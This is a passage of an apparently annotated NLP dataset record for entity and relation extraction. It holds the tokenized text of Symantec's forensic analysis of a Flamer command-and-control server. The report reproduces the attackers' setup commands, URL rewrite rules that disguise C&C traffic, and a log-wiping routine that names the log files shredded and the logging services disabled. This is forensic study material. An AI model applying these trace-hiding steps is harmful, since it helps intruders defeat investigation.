"T13", "type": "Time", "name": "May 18 2012", "sent_id": 136, "pos": [13, 16]}, {"old_id": "T14", "type": "Time", "name": "13:53", "sent_id": 138, "pos": [5]}, {"old_id": "T15", "type": "Time", "name": "11:26 (UTC)", "sent_id": 136, "pos": [19, 20]}, {"old_id": "T16", "type": "Malware", "name": "W32Flamer", "sent_id": 138, "pos": []}, {"old_id": "T17", "type": "Time", "name": "16:15", "sent_id": 139, "pos": [0]}, {"old_id": "T18", "type": "Time", "name": "March 25 2012", "sent_id": 140, "pos": [10, 13]}, {"old_id": "T19", "type": "Exploit", "name": "Newsforyou", "sent_id": 147, "pos": [2]}, {"old_id": "T20", "type": "Malware", "name": "W32Flamer", "sent_id": 147, "pos": []}, {"old_id": "T21", "type": "Event", "name": "Logging activities were disabled", "sent_id": 201, "pos": [11, 14]}, {"old_id": "T22", "type": "Event", "name": "existing log files were securely deleted", "sent_id": 201, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "UnloadCheckerphp", "sent_id": 232, "pos": []}, {"old_id": "T24", "type": "File", "name": "Eraserpy", "sent_id": 238, "pos": []}, {"old_id": "T25", "type": "Indicator", "name": "pycleanscr", "sent_id": 246, "pos": [4]}, {"old_id": "T26", "type": "File", "name": "Connectionpy", "sent_id": 293, "pos": []}, {"old_id": "T27", "type": "MalwareCharacteristics", "name": "dnslocationinfo", "sent_id": 292, "pos": []}, {"old_id": "T28", "type": "Time", "name": "May 18", "sent_id": 297, "pos": [5, 6]}, {"old_id": "T29", "type": "File", "name": "LogWiper_fixedtxt", "sent_id": 309, "pos": []}, {"old_id": "T30", "type": "File", "name": "Deletephp", "sent_id": 305, "pos": []}, {"old_id": "T31", "type": "File", "name": "pycleanscr", "sent_id": 302, "pos": [0]}, {"old_id": "T32", "type": "Exploit", "name": "Shred", "sent_id": 332, "pos": [5]}, {"old_id": "T33", "type": "Attacker", "name": "W32Flamer", "sent_id": 334, "pos": []}, {"old_id": "T34", "type": "Indicator", "name": "This function was added by D*** returns a true/false value depending on if this is a Windows box", "sent_id": 372, "pos": []}, {"old_id": "T35", "type": "Attacker", "name": "D***", "sent_id": 379, "pos": [0]}, {"old_id": "T36", "type": "Attacker", "name": "H*****", "sent_id": 383, "pos": [0]}, {"old_id": "T37", "type": "Attacker", "name": "O******", "sent_id": 386, "pos": [0]}, {"old_id": "T38", "type": "Attacker", "name": "R***", "sent_id": 389, "pos": [0]}, {"old_id": "T39", "type": "File", "name": "indexphp", "sent_id": 416, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "PROTOCOL_OLD*", "sent_id": 429, "pos": [0]}, {"old_id": "T41", "type": "Indicator", "name": "PROTOCOL_SIGNUP", "sent_id": 432, "pos": [0]}, {"old_id": "T42", "type": "Indicator", "name": "PROTOCOL_OLD_E**", "sent_id": 435, "pos": [0]}, {"old_id": "T43", "type": "Indicator", "name": "PROTOCOL_RED", "sent_id": 438, "pos": [0]}, {"old_id": "T44", "type": "Malware", "name": "W32Flamer", "sent_id": 441, "pos": []}, {"old_id": "T45", "type": "TrojanHorse", "name": "CLIENT_TYPE_SP", "sent_id": 460, "pos": [0]}, {"old_id": "T46", "type": "TrojanHorse", "name": "CLIENT_TYPE_SPE", "sent_id": 464, "pos": [0]}, {"old_id": "T47", "type": "TrojanHorse", "name": "CLIENT_TYPE_FL", "sent_id": 468, "pos": [0]}, {"old_id": "T48", "type": "TrojanHorse", "name": "CLIENT_TYPE_IP", "sent_id": 472, "pos": [0]}, {"old_id": "T49", "type": "MD5", "name": "0xfccd97e2513089e74ba707bbf4c1b0e5", "sent_id": 550, "pos": [0]}, {"old_id": "T50", "type": "Payload", "name": "59c5452fb2ba21091513ccdc1e0ec7fd", "sent_id": 551, "pos": [0]}, {"old_id": "T51", "type": "UserName", "name": "username", "sent_id": 563, "pos": [1]}, {"old_id": "T52", "type": "Hash", "name": "27934e96d90d06818674b98bec7230fa", "sent_id": 564, "pos": [2]}, {"old_id": "T53", "type": "UserName", "name": "news_user", "sent_id": 604, "pos": [0]}, {"old_id": "T54", "type": "Password", "name": "news_pass", "sent_id": 605, "pos": [0]}, {"old_id": "T55", "type": "Hash", "name": "27934e96d90d06818674b98bec7230fa", "sent_id": 624, "pos": [0]}, {"old_id": "T56", "type": "Country", "name": "Israel", "sent_id": 742, "pos": [0]}], "labels": [{"old_id": "R1", "r": "P32", "h": 0, "t": 1, "evidence": [26, 27]}, {"old_id": "R2", "r": "P33", "h": 7, "t": 6, "evidence": [43, 44, 45]}, {"old_id": "R3", "r": "P21", "h": 10, "t": 11, "evidence": [73, 74]}, {"old_id": "R4", "r": "P33", "h": 15, "t": 17, "evidence": [138, 139, 140]}, {"old_id": "R5", "r": "P33", "h": 15, "t": 12, "evidence": []}, {"old_id": "R6", "r": "P33", "h": 15, "t": 14, "evidence": []}, {"old_id": "R7", "r": "P33", "h": 15, "t": 13, "evidence": [138]}, {"old_id": "R8", "r": "P33", "h": 15, "t": 16, "evidence": [138, 139]}, {"old_id": "R9", "r": "P23", "h": 32, "t": 31, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 42, "t": 43, "evidence": [438, 439, 440, 441]}, {"old_id": "R11", "r": "P21", "h": 41, "t": 43, "evidence": [435, 436, 437, 438, 439, 440, 441]}, {"old_id": "R12", "r": "P21", "h": 40, "t": 43, "evidence": [432, 433, 434, 435, 436, 437, 438, 439, 440, 441]}, {"old_id": "R13", "r": "P21", "h": 39, "t": 43, "evidence": [429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441]}], "title": ["inputs/txt/201205SymantecFlamer"], "sents": [["Security", "Response"], ["Have", "I", "Got", "Newsforyou:"], ["Analysis", "of", "Flamer", "C&C"], ["Server"], ["Symantec", "Security"], ["Response"], ["Contents"], ["Overview", ".", "............................................................", "1"], ["Background", ".", "........................................................", "2"], ["The", "server", ".", "..........................................................", "3"], ["The", "home", "directory", ".", "............................................", "6"], ["Stress", "testing", "in", "applications", ".", ".......................", "6"], ["Cleaning", "up", ".", "...................................................", "7"], ["Disabling", "logging", ".", "..........................................", "7"], ["The", "Web", "application", ".", "..........................................", "7"], ["Authors", ".", ".........................................................", "8"], ["Protocols", ".", ".......................................................", "9"], ["Stolen", "Data", ".", ".................................................", "11"], ["Activity", ".", "........................................................", "13"], ["Payload", ".", ".......................................................", "14"], ["The", "control", "panel", ".", ".............................................", "14"], ["The", "database", ".", "....................................................", "16"], ["Schema", ".", "......................................................", "16"], ["Conclusion", ".", ".......................................................", "18"], ["Resources", "", ".", "........................................................", "19"], ["Overview"], ["W32", ".", "Flamer", "is", "a", "sophisticated", "cyber", "espionage", "tool", "that", "targeted"], ["the", "Middle", "East", ".", "It", "is", "modular", "in", "design", "and", "contains", "some", "novel"], ["functionality", ",", "most", "notably", "its", "ability", "to", "spread", "across", "networks", "using"], ["a", "previously", "unknown", "man-in-the-middle", "attack", "against", "Windows"], ["Update", ".", "Symantec", "has", "performed", "a", "detailed", "forensic", "analysis", "of", "two"], ["of", "the", "command-and-control", "(C&C)", "servers", "used", "in", "the", "W32", ".", "Flamer"], ["attacks", "from", "earlier", "this", "year", "."], ["Based", "on", "our", "analysis", ",", "we", "were", "able", "to", "uncover", "details", "such", "as", "when"], ["the", "servers", "were", "operational", ",", "what", "entities", "were", "targeted", ",", "nicknames"], ["of", "those", "involved", "in", "the", "attack", ",", "and", "techniques", "used", "by", "the", "attackers"], ["to", "avoid", "discovery", "should", "the", "command-and-control", "server", "be"], ["compromised", "."], ["Analysis", "of", "these", "C&C", "servers", "was", "performed", "as", "a", "joint", "effort", "between"], ["Symantec", ",", "CERT-Bund/BSI", ",", "IMPACT", ",", "and", "Kaspersky", ".", "This", "paper"], ["focuses", "on", "the", "detailed", "forensic", "examination", "Symantec", "carried", "out", "on"], ["the", "C&C", "server", "images", "."], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Background"], ["The", "first", "server", "was", "set", "up", "on", "May", "18", ",", "2012", ",", "and", ",", "just", "five", "hours", "after", "it", "was", "set", "up", ",", "it", "recorded", "the", "first"], ["interaction", "with", "a", "Flamer-compromised", "client", ".", "The", "server", "would", "go", "on", "to", "control", "at", "least", "a", "few", "hundred"], ["compromised", "clients", "over", "the", "next", "few", "weeks", ".", "The", "second", "server", "was", "set", "up", "on", "March", "25", ",", "2012", ",", "and", "controlled"], ["over", "a", "thousand", "clients", "in", "a", "period", "of", "just", "over", "one", "week", "."], ["The", "servers", "had", "been", "set", "up", "to", "record", "a", "minimal", "amount", "of", "information", "in", "case", "of", "discovery", ".", "The", "systems", "were"], ["configured", "to", "disable", "any", "unnecessary", "logging", "events", "and", "entries", "in", "the", "database", "were", "deleted", "at", "regular"], ["intervals", ".", "Existing", "log", "files", "were", "securely", "deleted", "from", "the", "servers", "on", "a", "regular", "basis", ".", "These", "steps", "were", "taken", "in"], ["order", "to", "hamper", "any", "investigation", "should", "the", "server", "fall", "into", "the", "hands", "of", "investigators", "or", "law", "enforcement", "."], ["However", ",", "the", "attackers", "were", "not", "thorough", "enough", ",", "as", "files", "revealing", "the", "entire", "history", "of", "the", "servers\u2019", "setup", "were"], ["available", "and", "a", "limited"], ["Figure", "1"], ["set", "of", "encrypted", "records"], ["Data", "security", "compartmentalization", "used", "by", "W32", ".", "Flamer", "attackers"], ["in", "the", "database", "revealed"], ["that", "compromised", "clients"], ["had", "been", "connecting"], ["from", "the", "Middle", "East", ".", "We"], ["were", "also", "able", "to", "recover"], ["the", "nicknames", "of", "four"], ["authors\u2014D***", ",", "H*****", ","], ["O******", ",", "and", "R***\u2014who"], ["had", "worked", "on", "the", "code"], ["at", "various", "stages", "and", "on"], ["differing", "aspects", "of", "the"], ["project", "."], ["On", "both", "servers", "commandand-control", "activity"], ["happens", "through", "a"], ["Web", "application", "called"], ["Newsforyou", ".", "It", "processes"], ["the", "W32", ".", "Flamer", "client"], ["interactions", "and", "provides"], ["a", "simple", "control", "panel", "."], ["The", "control", "panel", "allows"], ["the", "attackers", "to", "upload"], ["packages", "of", "code", "to"], ["deliver", "to", "compromised"], ["clients", ",", "and", "download"], ["packages", "containing"], ["stolen", "client", "data", "."], ["However", ",", "in", "a", "technique"], ["not", "previously", "seen"], ["before", "the", "uploaded", "and"], ["downloaded", "packages", "are"], ["encrypted", ",", "so", "infiltrating"], ["the", "command-and-control"], ["server", "does", "not", "reveal"], ["the", "code", "or", "the", "stolen"], ["client", "data", ".", "The", "command-"], ["Page", "2"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["and-control", "server", "simply", "serves", "as", "a", "proxy", "for", "the", "data", "and", "the", "data", "is", "encrypted", "and", "decrypted", "offline", "by", "the"], ["attackers", "using", "keys", "unique", "to", "each", "client", ".", "This", "application", "also", "contains", "functionality", "to", "communicate", "with"], ["clients", "compromised", "by", "malware", "other", "than", "Flamer", ".", "The", "Web", "application", "was", "designed", "to", "be", "a", "framework", "for"], ["supporting", "different", "malware", "campaigns", "."], ["In", "addition", "to", "avoiding", "the", "compromise", "of", "their", "operations", ",", "preventing", "both", "the", "uploading", "of", "rogue", "code", "and"], ["viewing", "of", "stolen", "data", ",", "the", "setup", "also", "maintains", "a", "clear", "distinction", "of", "roles", ".", "The", "roles", "include", "those", "responsible"], ["for", "setting", "up", "the", "server", "(admins)", ",", "those", "responsible", "for", "uploading", "packages", "and", "downloading", "stolen", "data"], ["through", "the", "control", "panel", "(operators)", ",", "and", "those", "holding", "the", "private", "key", "with", "the", "ability", "to", "decrypt", "the", "stolen"], ["data", "(attack", "coordinators)", ".", "The", "operators", "themselves", "may", "actually", "be", "completely", "unaware", "of", "the", "contents", "in", "the"], ["stolen", "data", ".", "This", "is", "due", "to", "design", "of", "the", "process", "to", "use", "data", "security", "compartmentalization", "techniques", ",", "as", "shown"], ["in", "Figure", "1", "."], ["Despite", "these", "techniques", ",", "we", "were", "still", "able", "to", "determine", "that", "one", "of", "the", "servers", "delivered", "a", "module", "instructing"], ["Flamer", "to", "commit", "suicide", "and", "wipe", "itself", "off", "computers", "in", "late", "May", "2012", ",", "an", "action", "we", "also", "witnessed", "through"], ["compromised", "honeypots", "."], ["Finally", ",", "access", "to", "the", "control", "panel", "required", "a", "password", "which", "is", "stored", "as", "a", "hash", ".", "Despite", "brute", "force", "attempts"], ["at", "reversing", "the", "hash", "to", "plain", "text", ",", "we", "were", "unable", "to", "determine", "the", "plain", "text", "password", "."], ["What", "follows", "is", "a", "thorough", "analysis", "of", "one", "of", "the", "command-and-control", "servers", ",", "detailing", "the", "server", "setup", ",", "the"], ["Web", "application", "developed", "by", "at", "least", "four", "separate", "authors", "since", "2006", ",", "the", "control", "panel", "used", "by", "the", "operators", ","], ["and", "the", "database", "that", "helps", "drive", "the", "application", ".", "The", "report", "also", "includes", "key", "information", "about", "a", "second"], ["server", ",", "but", "in-depth", "details", "have", "been", "omitted", "to", "maintain", "the", "brevity", "of", "this", "report", ".", "The", "functionality", "and"], ["structure", "of", "both", "servers", "is", "identical", ".", "The", "differences", "are", "mainly", "in", "the", "amount", "of", "data", "and", "number", "of", "clients", "the"], ["servers", "were", "exposed", "to", "."], ["The", "server"], ["File", "system"], ["The", "following", "table", "details", "the", "important", "locations", "relevant", "to", "the", "investigation", "of", "the", "command-and-control"], ["servers", "."], ["Table", "1"], ["Location"], ["Description"], ["/root/", ".", "bash_history"], ["Contains", "a", "history", "of", "root", "user", "commands"], ["/var/spool/crontabs/root"], ["Scripts", "set", "up", "to", "run", "at", "regular", "intervals"], ["//home/[USERNAME]"], ["Operator", "home", "directory", ",", "contains", "various", "scripts"], ["/var/www/htdocs/newsforyou"], ["Command-and-Control", "Web", "application"], ["/var/lib/mysql"], ["MySQL", "database"], ["Server", "setup"], ["The", "first", "sign", "of", "activity", "from", "the", "attackers", "on", "the", "first", "server", "was", "May", "18", ",", "2012", ".", "At", "11:26", "(UTC)", "the", "first"], ["scheduled", "job", "was", "run", "and", "a", "little", "over", "two", "hours", "later", "the", "server", "was", "fully", "operational", ".", "A", "malicious", "package", "was"], ["uploaded", "to", "the", "server", "at", "13:53", ".", "The", "first", "recorded", "interaction", "with", "a", "W32", ".", "Flamer", "compromised", "client", "was", "at"], ["16:15", ",", "when", "stolen", "data", "was", "uploaded", "to", "the", "server", "."], ["In", "comparison", ",", "the", "second", "server", "saw", "initial", "activity", "on", "March", "25", ",", "2012", ",", "and", "was", "fully", "operational", "on", "the", "same"], ["day", "."], ["Page", "3"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["During", "the", "server", "set", "up", ",", "the", "attackers", "installed", "various", "applications", "and", "tested", "connections", "to", "the", "MySQL"], ["database", "which", "supported", "their", "custom", "Web", "application", ".", "The", "end", "goal", "was", "to", "install", "a", "command-and-control"], ["application", "called", "Newsforyou", "which", "interacted", "with", "compromised", "W32", ".", "Flamer", "clients", "."], ["An", "important", "step", "taken", "by", "the", "attackers", "was", "to", "hide", "traces", "of", "their", "activity", "on", "the", "server", ".", "They", "did", "this", "by"], ["disabling", "logging", "and", "securely", "removing", "existing", "log", "files", ".", "The", "attackers", ",", "however", ",", "did", "not", "clear", "out", "the", "history"], ["of", "commands", "issued", "through", "the", "console", "by", "the", "administrator", "(root)", "account", ".", "This", "data", "was", "visible", "and", "was"], ["retrieved", "from", "the", "/root/", ".", "bash_history", "file", ",", "which", "revealed", "these", "activities", ".", "The", "following", "table", "lists", "and"], ["describes", ",", "in", "brief", ",", "a", "subset", "of", "commands", "that", "are", "most", "relevant", "to", "the", "server", "set", "up:"], ["Table", "2"], ["Command", "Executed"], ["Description"], ["netstat", "\u2013an"], ["Checks", "open", "network", "connections"], ["telnet", "localhost", "3306"], ["Tests", "MySQL", "server", "is", "accepting", "connections"], ["nano", "apache2", ".", "conf"], ["Configures", "Web", "server"], ["adduser", "[USERNAME]"], ["Adds", "user", "[USERNAME]"], ["crontab", "/etc/cron", ".", "newsforyou"], ["Cronjob", "executes", "scripts", "at", "regular", "intervals"], ["openssl", "req", "-newkey", "rsa:1024", "-nodes", "-x509", "-days"], ["Creates", "SSL", "key"], ["python", "__main__", ".", "py", "0", "2", "1", "\"127", ".", "0.0.1\"", "100", "100"], ["Simulator", "test", "to", "add", "entry", "(stolen", "data)"], ["python", "__main__", ".", "py", "2", "1-2", "1", "\"127", ".", "0.0.1\"", "100"], ["Simulator", "test", "to", "retrieve", "news", "entry", "(payload)"], ["nano", "/etc/apache2/ports", ".", "conf"], ["Configures", "Web", "server", "to", "listen", "on", "TCP", "port", "443"], ["cp", "/home/[USERNAME]/LogWiper_fixed", ".", "txt", "/LogWiper", ".", "sh"], ["Prepares", "log", "wiper", "file", "as", "BASH", "script"], ["sh", "/LogWiper", ".", "sh"], ["Wipes", "logs", "and", "disables", "logging", "services"], ["mkdir", "/var/www/common/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/wp-content/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/pages/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/services/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["nano", "/etc/apache2/sites-enabled/default-ssl"], ["Sets", "up", "URL", "redirects"], ["mkdir", "-p", "/var/www/cgi-bin"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "-p", "/var/www/htdocs/newsforyou"], ["Create", "Web", "appplication", "folder"], ["php5", "", ".", "./DB_creation_script.php"], ["Creates", "database"], ["/etc/init", ".", "d/apache2", "restart"], ["Restarts", "Web", "server"], ["iptables", "-A", "INPUT", "-p", "tcp", "--dport", "22", "-j", "ACCEPT"], ["Accepts", "connections", "on", "TCP", "port", "22(SSH)"], ["iptables", "-A", "INPUT", "-p", "tcp", "--dport", "443", "-j", "ACCEPT"], ["Accepts", "connections", "on", "TCP", "port", "443(HTTPS)"], ["Following", "these", "commands", ",", "the", "Apache", "server", "was", "configured", "to", "listen", "on", "TCP", "ports", "443", "and", "8080", ".", "The", "firewall"], ["was", "also", "reconfigured", "to", "allow", "connections", "over", "SSH", "and", "HTTPS", ".", "Logging", "activities", "were", "disabled", "and", "existing"], ["log", "files", "were", "securely", "deleted", "where", "necessary", ".", "The", "server", "is", "now", "ready", "to", "interact", "with", "compromised", "Flamer"], ["clients", "through", "the", "Newsforyou", "application", "."], ["The", "attackers", "also", "set", "up", "some", "URL", "redirections", "to", "disguise", "the", "true", "nature", "of", "the", "requests", "to", "an", "inexperienced"], ["eye", ".", "They", "would", "appear", "to", "look", "like", "legitimate", "requests", "for", "regular", "looking", "folder", "names", ".", "An", "example", "of", "one", "of"], ["the", "redirect", "rules", "is", "shown", "below:"], ["/etc/apache2/sites-available/default-ssl"], ["Page", "4"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["ScriptAlias", "/cgi-bin/", "/var/www/cgi-bin/"], ["<Directory", "\u201c/var/www/cgi-bin\u201d>"], ["AllowOverride", "None"], ["Options", "+ExecCGI", "-MultiViews", "+SymLinksIfOwnerMatch"], ["Order", "allow", ",", "deny"], ["Allow", "from", "all"], ["RewriteEngine", "on"], ["RewriteRule", "^counter\\", ".", "cgi$", "/newsforyou/index", ".", "php"], ["</Directory>"], ["Scheduled", "tasks"], ["A", "cronjob", "was", "set", "up", "to", "periodically", "delete", "files", "from", "the", "file", "system", "and", "remove", "older", "entries", "from", "the", "database:"], ["/etc/cron", ".", "newsforyou"], ["Table", "3"], ["Repeat", "Interval"], ["Command"], ["2", "minutes"], ["/var/www/htdocs/newsforyou/UnloadChecker", ".", "php", ">>", "/var/log/newsforyou", ".", "log"], ["6", "hours"], ["*", "python", "/home/[USERNAME]/pycleaner/Eraser", ".", "py"], ["@Midnight"], ["php", "/home/[USERNAME]/delete", ".", "php"], ["UnloadChecker", ".", "php,", "which", "is"], ["executed", "every", "two", "minutes", ","], ["retrieves", "data", "uploaded", "from", "the"], ["compromised", "computer", "and", "places"], ["it", "in", "a", "tar", "archive", ".", "The", "archive"], ["could", "then", "be", "downloaded", "by", "the"], ["operators", ".", "Eraser", ".", "py", "is", "a", "script", "used"], ["to", "wipe", "certain", "files", "and", "content"], ["from", "folders", ".", "On", "one", "of", "the", "servers"], ["the", "operators", "made", "an", "error", "when"], ["setting", "up", "the", "scheduled", "task", ".", "They"], ["used", "the", "folder", "name", "pycleaner"], ["when", "creating", "the", "task", ",", "but", "this"], ["folder", "does", "not", "exist", ".", "The", "folder"], ["containing", "the", "script", "is", "pycleanscr", "."], ["As", "a", "result", ",", "the", "Eraser", ".", "py", "script", "was"], ["never", "automatically", "executed", "."], ["Figure", "2"], ["Communications", "between", "C&C", "server", "and", "compromised"], ["computers"], ["Figure", "2", "illustrates", "the", "simple", "setup"], ["now", "in", "place", "for", "communicating", "with"], ["W32", ".", "Flamer", "compromised", "clients", "."], ["The", "next", "sections", "discuss", "the", "files"], ["and", "applications", "of", "most", "interest", "to"], ["the", "investigation", ",", "along", "with", "their"], ["locations", ".", "The", "analysis", "begins", "in", "the"], ["home", "directory", "of", "the", "unique", "added"], ["user", ",", "a", "folder", "that", "is", "created", "once"], ["the", "user", "is", "added", "during", "the", "initial"], ["set", "up", ".", "The", "usernames", "here", "were"], ["Page", "5"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["short", "three-letter", "names", ",", "unique", "to", "each", "server", "."], ["The", "home", "directory"], ["Location:", "/home/[USERNAME]"], ["The", "following", "table", "contains", "the", "location", "and", "a", "brief", "description", "of", "the", "files", "and", "folders", "present", "in", "the", "user\u2019s"], ["home", "directory:"], ["Table", "4"], ["File/Directory"], ["Description"], ["", ".", "/.bashrc"], ["Standard", "", ".", "bashrc", "with", "no", "modifications"], ["Simulator/"], ["Python", "application", "used", "to", "test", "the", "Newsforyou", "application"], ["pycleanscr/"], ["Python", "application", "used", "to", "free", "up", "disk", "space", "if", "necessary"], ["", ".", "/LogWiper_fixed.txt"], ["Script", "which", "disables", "logging", "and", "securely", "deletes", "specific", "log", "files"], ["", ".", "/RequestHandler.php"], ["Used", "in", "the", "Newsforyou", "Web", "application"], ["", ".", "/Delete.php"], ["PHP", "script", "which", "delete", "files", "and", "entries", "in", "the", "MySQL", "database"], ["Stress", "testing", "the", "application"], ["Simulator"], ["This", "application", "consists", "of", "a", "set", "of", "Python", "scripts", ",", "which", "are", "used", "to", "stress", "test", "the", "Newsforyou", "application", "."], ["This", "application", "was", "only", "present", "on", "one", "of", "the", "servers", ".", "The", "application", "connects", "to", "a", "chosen", "server", "and", "issues"], ["various", "queries", "that", "conform", "to", "the", "C&C", "server", "protocol", ".", "The", "tests", "performed", "during", "the", "set", "up", "were", "to", "add", "an"], ["entry", "(stolen", "data)", "and", "to", "retrieve", "a", "news", "entry", "(payload)", "."], ["A", "point", "of", "interest", "here", "is", "the", "presence", "of", "dnslocation", ".", "info", "as", "part", "of", "the", "HTTP", "request", "header", "the", "script", "builds", "in"], ["a", "file", "named", "Connection", ".", "py.", "This", "is", "a", "known", "Flamer", "C&C", "server", "domain", ",", "indicating", "that", "the", "code", "is", "being", "shared"], ["and", "used", "to", "test", "across", "various", "C&C", "servers", ".", "The", "timestamp", "on", "this", "file", "supports", "this", "idea", "as", "it", "is", "stamped", "March"], ["22", ",", "2012", "."], ["When", "a", "Python", "script", "is", "executed", ",", "a", "compiled", "Python", "file", "(", ".", "pyc)", "is", "generated", ".", "Examining", "these", "files", ",", "we", "confirmed"], ["this", "application", "was", "executed", "on", "May", "18", "which", "corroborates", "our", "finding", "about", "the", "system", "configuration", "date", "."], ["Page", "6"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Cleaning", "up"], ["pycleanscr"], ["pycleanscr", "checks", "how", "much", "free", "disk", "space", "is", "available", "on", "the", "root", "partition", ".", "It", "deletes", "the", "files", "in", "/var/www/"], ["htdocs/newsforyou/tmp/", "if", "the", "amount", "of", "the", "disk", "space", "in", "use", "is", "greater", "than", "75", "percent", "."], ["Delete", ".", "php"], ["Deletes", "entries", "in", "the", "news_entries", "table", "of", "the", "MySQL", "database", "and", "securely", "deletes", "the", "files", "referenced", "by"], ["that", "entry", "on", "disk", "that", "are", "older", "than", "30", "days", "."], ["Disabling", "logging"], ["LogWiper_fixed", ".", "txt"], ["This", "", ".", "txt", "file", "is", "renamed", "to", "a", "", ".", "sh", "BASH", "script", "and", "run", "to", "disable", "logging", "services", ",", "to", "securely", "delete", "any", "prior", "log"], ["files", "created", ",", "and", "to", "disable", "logging", "in", "two", "particular", "applications", "required", "by", "the", "attackers:", "Apache", "and", "SSH", "."], ["Table", "5"], ["Log", "files", "deleted"], ["Services", "disabled"], ["Services", "with", "logging", "disabled"], ["/var/log/wtmp"], ["Rsyslog"], ["Apache"], ["/var/log/lastlog"], ["Sysklogd"], ["SSH"], ["/var/run/utmp"], ["Msyslog"], ["/var/log/mail", ".", "*"], ["syslog-ng"], ["/var/log/syslog*"], ["/var/log/messages"], ["hidden", "files", "in", "/root", "and", "/"], ["home"], ["/var/log/auth/*"], ["/var/log/apache2/*"], ["Files", "are", "securely", "deleted", "using", "Shred", ",", "a", "tool", "that", "repeatedly", "overwrites", "files", "to", "prevent", "their", "recovery", ",", "even"], ["forensically", "."], ["The", "next", "section", "will", "discuss", "the", "Web", "application", "processing", "the", "compromised", "W32", ".", "Flamer", "client", "requests", "."], ["The", "Web", "application"], ["Location:", "/var/www/htdocs/newsforyou/"], ["The", "Newsforyou", "application", "is", "written", "in", "PHP", "and", "contains", "the", "primary", "command-and-control", "functionality", "split"], ["into", "two", "parts:", "the", "main", "module", "and", "the", "control", "panel", ".", "The", "control", "panel", "is", "a", "basic", "user", "interface", "which", "allows"], ["packages", "to", "be", "uploaded", "and", "installed", "on", "chosen", "W32", ".", "Flamer", "clients", ".", "It", "also", "allows", "for", "the", "retrieval", "of", "stolen"], ["data", "that", "had", "been", "uploaded", "from", "these", "clients", "."], ["Page", "7"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "table", "below", "describes", "the", "layout", "and", "offers", "a", "brief", "description", "of", "the", "components", "of", "the", "Newsforyou"], ["application:"], ["Table", "6"], ["Directories"], ["Description"], ["/newsforyou"], ["Main", "command", "and", "control", "application"], ["/newsforyou/news"], ["Encrypted", "packages", "distributed", "to", "all", "infected", "clients*"], ["/newsforyou/ads"], ["Encrypted", "packages", "distributed", "to", "chosen", "infected", "clients**"], ["/newsforyou/entries"], ["Encrypted", "data", "uploaded", "from", "infected", "clients**"], ["/newsforyou/files"], ["Temporary", "location", "for", "files", "when", "creating", "unloads"], ["/newsforyou/tmp"], ["Temporary", "files", "(database", "exports", ",", "tar", "archives)"], ["/newsforyou/bak"], ["Archives", "generated", "when", "unloading"], ["/newsforyou/CP"], ["Control", "panel"], ["*Symmetric", "encryption", "with", "known", "key"], ["**Asymmetric", "encryption", "with", "known", "public", "key", ",", "private", "key", "unknown"], ["The", "application", "is", "designed", "to", "resemble", "a", "simple", "news/blog", "application", ".", "This", "approach", "may", "serve", "to", "disguise"], ["the", "true", "nature", "of", "the", "application", "from", "any", "automation", "or", "casual", "inspection", ".", "Although", "the", "code", "was", "running", "on"], ["a", "Linux", "server", ",", "it", "is", "likely", "some", "of", "the", "command-and-control", "servers", "were", "running", "Windows", ",", "or", "at", "least", "that", "the"], ["code", "was", "developed", "and", "tested", "on", "Windows", "computers", "."], ["The", "following", "comment", "was", "present", "in", "one", "of", "the", "PHP", "files:"], ["--", "This", "function", "was", "added", "by", "D***", ",", "returns", "a", "true/false", "value"], ["depending", "on", "if", "this", "is", "a", "Windows", "box"], ["Authors"], ["The", "PHP", "source", "code", "references", "four", "authors", ",", "identified", "in", "the", "table", "below", ",", "and", "also", "attributes", "to", "them"], ["particular", "functionality", "within", "the", "code:"], ["Table", "7"], ["@author", "Edited", "Files", "Dates"], ["D***"], ["33"], ["12/4/2006"], ["01/23/2007"], ["H*****"], ["10"], ["09/02/2007"], ["O******"], ["4"], ["12/3/2006"], ["R***"], ["1"], ["2011"], ["Control", "Panel", "Protocols", "Database", "Cleanup", "Encryption"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["It", "is", "clear", "that", "D***", "and", "H*****", "had", "the", "most", "input", "into", "the", "project", ",", "having", "edited", "the", "most", "files", "in", "the"], ["application", ".", "O******", "and", "R***", "were", "tasked", "with", "database", "and", "cleanup", "operations", "and", "could", "easily", "have", "had", "little"], ["or", "no", "understanding", "of", "the", "inner", "workings", "of", "the", "application", "."], ["However", ",", "D***", "and", "H*****", "have", "direct", "involvement", "in", "handling", "interactions", "with", "clients", ",", "as", "they", "worked", "on", "the"], ["protocols", "and", "also", "worked", "on", "the", "control", "panel", "that", "the", "operators", "used", ".", "It", "is", "likely", "D***", "and", "O******", "knew", "each"], ["other", ",", "as", "they", "both", "worked", "on", "the", "same", "files", "and", "during", "a", "similar", "time", "period", "in", "December", "2006", "."], ["Page", "8"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["H*****", "is", "responsible", "for", "the", "SignupProtocol", ",", "while", "D***", "is", "involved", "in", "the", "OldProtocol", "(Flamer)", ",", "both", "of", "which"], ["will", "be", "discussed", "in", "more", "detail", "in", "the", "next", "section", "."], ["Protocols"], ["The", "main", "module", "communicating", "with", "the", "compromised", "clients", "is", "index", ".", 